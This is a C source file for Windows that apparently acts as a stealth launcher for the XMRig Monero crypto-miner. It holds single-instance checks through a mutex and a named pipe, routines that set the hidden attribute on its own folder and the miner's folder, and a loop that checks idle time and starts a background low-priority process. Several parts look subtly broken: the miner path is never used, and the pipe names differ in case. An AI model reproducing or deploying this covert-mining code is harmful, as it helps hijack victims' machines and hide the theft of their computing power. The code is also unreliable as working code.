#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <process.h>

void setFolderHidden(const char *folderPath);
bool isAlreadyRunning();

/**
 * setFolderHidden - hides Folder in dir.
 * @folderPath: path to folder.
 */
void setFolderHidden(const char *folderPath)
{
	DWORD attributes = GetFileAttributesA(folderPath);
	if (attributes != INVALID_FILE_ATTRIBUTES)
	{
		/*Add the FILE_ATTRIBUTE_HIDDEN flag to make the folder hidden.*/
		attributes |= FILE_ATTRIBUTE_HIDDEN;
		SetFileAttributesA(folderPath, attributes);
	}
}

bool isAlreadyRunning()
{
	HANDLE mutex = CreateMutex(NULL, TRUE, "MyProgramMutex");
	if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED)
	{
		CloseHandle(mutex);
		return true;
	}

	HANDLE pipe = CreateFile(
		"\\\\.\\pipe\\MyProgramPipe",
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);

	if (pipe != INVALID_HANDLE_VALUE)
	{
		CloseHandle(pipe);
		return true;
	}

	return false;
}

int main(void)
{
	if (isAlreadyRunning())
	{
		return (0);
	}

	/*Create a named pipe to block other instances from running.*/
	HANDLE pipe = CreateNamedPipe(
		"\\\\.\\pipe\\myProgramPipe",
		PIPE_ACCESS_OUTBOUND,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
		1,
		0,
		0,
		0,
		NULL);

	if (pipe == INVALID_HANDLE_VALUE)
	{
		return 1;
	}

	char currentDir[MAX_PATH];
	char targetDir[MAX_PATH];

	/*Get the path of the currently running program.*/
	GetModuleFileName(NULL, currentDir, MAX_PATH);

	/*Replace "your_program_to_start.exe" with the name of the targeted program.*/
	const char *targetProgramName = "C:\\Users\\user\\Desktop\\Crypto-Miners\\MONERO\\Windows\\xmrig.exe";

	/*Find the path to the folder containing the targeted program.*/
	GetModuleFileName(NULL, targetDir, MAX_PATH);
	char *lastBackslash = strrchr(targetDir, '\\');
	if (lastBackslash != NULL)
	{
		/*Remove the program name to get the parent folder.*/
		*lastBackslash = '\0';
	}

	/*Hide the current folder and the folder containing the targeted program.*/
	setFolderHidden(currentDir);
	setFolderHidden(targetDir);


	bool commandExecuted = false;

	while (1)
	{
		if (!commandExecuted)
		{
			/*Check system idle time.*/
			LASTINPUTINFO lii;
			lii.cbSize = sizeof(LASTINPUTINFO);
			DWORD lastInput = 0;

			if (GetLastInputInfo(&lii))
			{
				if (lastInput != lii.dwTime)
				{
					/* Computer is in use. Run the program in the background with 25% resources. */
					char cmd[256];
					snprintf(cmd, sizeof(cmd), "start /B /low \"%s\"", currentDir);
					STARTUPINFO si = {sizeof(si)};
					PROCESS_INFORMATION pi;
					if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
					{
						WaitForSingleObject(pi.hProcess, INFINITE);
						CloseHandle(pi.hProcess);
						CloseHandle(pi.hThread);
					}
					commandExecuted = true;
				}
			}
		}
		Sleep(1000);
	}

	/*Release the named pipe and the mutex before exiting.*/
	CloseHandle(pipe);
	CloseHandle(CreateMutex(NULL, TRUE, "myProgramMutex"));

	return (0);
}
